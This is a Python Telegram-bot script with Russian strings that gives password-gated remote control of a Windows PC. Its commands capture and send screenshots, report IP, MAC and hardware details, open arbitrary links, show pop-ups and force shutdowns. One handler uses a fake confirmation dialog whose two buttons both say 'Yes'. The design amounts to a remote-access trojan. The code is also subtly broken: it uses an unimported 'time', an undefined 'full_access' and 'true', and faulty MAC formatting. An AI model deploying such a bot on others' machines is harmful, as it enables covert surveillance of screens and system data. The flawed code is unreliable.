import os, sys
import telebot
import tempfile
from PIL import ImageGrab
import requests
import webbrowser
import urllib.parse
import pyautogui
from PIL import Image, ImageDraw
import psutil
import platform
import socket


API_TOKEN = 'токен бота'

bot = telebot.TeleBot(API_TOKEN)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, 'Введите пароль:')
    bot.register_next_step_handler(message, check_password)

def check_password(message):
    password = message.text.strip()
    if password == 'пароль уровня доступа 1':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Получить скриншот")
        markup.add("Показать IP-адрес")
        markup.add("Свернуть все окна")
        markup.add("Написать сообщение")
        markup.add("Инфо о пк")
        bot.send_message(message.chat.id, 'Привет! Выберите действие:', reply_markup=markup)
    elif password == 'пароль уровня доступа 2':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Получить скриншот")
        markup.add("Открыть ссылку")
        markup.add("Показать IP-адрес")
        markup.add("Свернуть все окна")
        markup.add("Написать сообщение")
        markup.add("Инфо о пк")
        bot.send_message(message.chat.id, 'Привет! Выберите действие:', reply_markup=markup)
    elif password == 'пароль уровня доступа 3':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Получить скриншот")
        markup.add("Выключить")
        markup.add("Открыть ссылку")
        markup.add("Показать IP-адрес")
        markup.add("Свернуть все окна")
        markup.add("Написать сообщение")
        markup.add("Инфо о пк")
        markup.add("Выключить да")
        bot.send_message(message.chat.id, 'Привет! Выберите действие:', reply_markup=markup)
    else:
        bot.send_message(message.chat.id, 'Неверный пароль. Попробуйте снова.')
        send_welcome(message)

@bot.message_handler(regexp='выключить да')
def prinud_virub(message):
    result = pyautogui.confirm(text='Выключить?', title='Подтверждение', buttons=['Да', 'Да'])

    if not result or result == 'Да':
        os.system("shutdown -s -t 3")
        pyautogui.alert("3")
        time.sleep(1)
        pyautogui.alert("2")
        time.sleep(1)
        pyautogui.alert("1")
        pass


@bot.message_handler(regexp='инфо о пк')
def system_info(message):
    bot.send_message(message.chat.id, 'Получаю инфу о пк...')

    system_info = f"Система: {platform.system()} {platform.release()}\n"
    system_info += f"Версия Python: {platform.python_version()}\n"
    system_info += f"Архитектура: {platform.architecture()[0]}\n"
    system_info += f"Имя узла сети: {platform.node()}\n"
    system_info += f"Процессор: {platform.processor()}\n"
    
    gpu_info = "Видеокарта: "
    try:
        import wmi
        w = wmi.WMI()
        for gpu in w.Win32_VideoController():
            gpu_info += f"{gpu.name}, "
    except:
        gpu_info += "Информация не доступна"
    system_info += gpu_info[:-2] + "\n" 
    
    memory_info = f"ОЗУ: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} ГБ\n"
    
    system_info += memory_info

    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        mac_address = ':'.join(['{:02x}'.format((psutil.net_if_addrs()[interface][0].address).split(':')[i]) for i in range(6)])
        network_info = f"IP-адрес: {ip_address}\nMAC-адрес: {mac_address}\n"
    except:
        network_info = "Информация о сети не доступна\n"
    system_info += network_info
    
    bot.send_message(message.chat.id, system_info)


@bot.message_handler(regexp='написать сообщение')
def send_message_dialog(message):
    bot.send_message(message.chat.id, "Введите сообщение:")
    bot.register_next_step_handler(message, send_message)

def send_message(message):
    bot.send_message(message.chat.id, f"Вы написали: {message.text}")
    msg = message.text
    pyautogui.alert(message.text)

@bot.message_handler(regexp='выключить')
def echo_message(message):
    if full_access == true:
        bot.send_message(message.chat.id, "Выключаю...")
        os.system("shutdown -s -t 0")
    else:
        bot.send_message(message.chat.id, "У вас нет доступа к этой функции") 

@bot.message_handler(regexp='получить скриншот')
def echo_message(message):
    path = tempfile.gettempdir() + 'screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_message(message.chat.id, "Скриню...")
    bot.send_photo(message.chat.id, open(path, 'rb'))

@bot.message_handler(regexp='показать ip-адрес')
def get_ip_address(message):
    bot.send_message(message.chat.id, "Получаю IP-адрес...")
    ip_address = requests.get('https://api.ipify.org').text
    bot.send_message(message.chat.id, f"Ваш IP-адрес: {ip_address} ")

@bot.message_handler(regexp='свернуть все окна')
def ocna(message):
    bot.send_message(message.chat.id, "Сворачиваю...")
    bot.send_message(message.chat.id, "Все окна свернуты")
    os.system("explorer.exe shell:::{3080F90D-D7AD-11D9-BD98-0000947B0257}")

@bot.message_handler(func=lambda message: True)
def open_link(message):
    url = message.text.strip()
    if not url.startswith('http'):
        bot.send_message(message.chat.id, 'Ссылка должна начинаться на https://(и тут ссылка).')
        return
    parsed_url = urllib.parse.urlparse(url)
    if not (parsed_url.scheme and parsed_url.netloc):
        bot.send_message(message.chat.id, 'Это не похоже на ссылку.')
        return
    excluded_domains = [ 'сайт которій хотите запретить', 'сайт которій хотите запретить' ] # мжет работать не коректно
    if any(parsed_url.netloc.lower().endswith(domain) for domain in excluded_domains):
        bot.send_message(message.chat.id, 'Извините, но открытие ссылок на некоторые домены запрещено.')
    else:
        bot.send_message(message.chat.id, f'Открываю ссылку: {url}')
        webbrowser.open(url)


        


bot.infinity_polling()
